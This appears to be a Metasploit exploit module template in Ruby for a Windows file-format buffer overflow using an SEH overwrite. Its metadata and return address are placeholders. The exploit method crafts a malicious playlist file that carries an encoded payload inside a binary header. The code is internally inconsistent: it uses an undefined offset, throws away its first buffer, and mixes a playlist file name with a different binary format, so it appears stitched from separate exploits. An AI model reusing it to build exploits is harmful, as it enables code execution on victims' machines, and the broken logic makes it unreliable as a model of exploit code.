##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::Remote::Seh

  def initialize(info={})
    super(update_info(info,
                      'Name' => '[Vendor] [Software] [Root Cause] [Vulnerability type]',
                      'Description' => %q(
        Say something that the user might need to know
      ),
                      'License' => MSF_LICENSE,
                      'Author' => ['Name'],
                      'References' =>
                        [
                          ['URL', '']
                        ],
                      'Platform' => 'win',
                      'Targets' =>
                        [
                          [
                            'System or software version', {
                              # This will be available in `target.ret`
                              'Ret' => 0x41414141
                          }
                          ]
                        ],
                      'Payload' =>
                        {
                          'BadChars' => "\x00"
                        },
                      'Privileged' => false,
                      'DisclosureDate' => '',
                      'DefaultTarget' => 0))
  end

  def file_format_filename
    'payload.pls'
  end

  def exploit
    sploit = rand_text(target['Offset'])
    sploit << generate_seh_record(target.ret)
    sploit << payload.encoded
    length_sploit = [sploit.length].pack("v")

    sploit = '[playlist]\r\nFile1=\\\\'
    sploit << payload.encoded
    sploit << '\x90' * (846 - payload.encoded.length)

    header = "\x46\x47" # magic
    header << "\x03\x04" # version
    header << "\x17\x00\x00\x00"
    types  = "\x01\x00\x00\x00" # count
    # class 1 => Object
    types << "\x71\x49\x65\x51\x87\x0D\x51\x4A\x91\xE3\xA6\xB5\x32\x35\xF3\xE7"
    # functions
    functions = "\x37\x00\x00\x00" # count
    #function 1
    functions << "\x01\x01" # class
    functions << "\x00\x00" # dummy
    functions << length_sploit # function name length
    functions << sploit # crafted function name

    maki = header
    maki << types
    maki << functions

    print_status("Creating '#{file_format_filename}' file ...")

    file_create(maki)
  end

end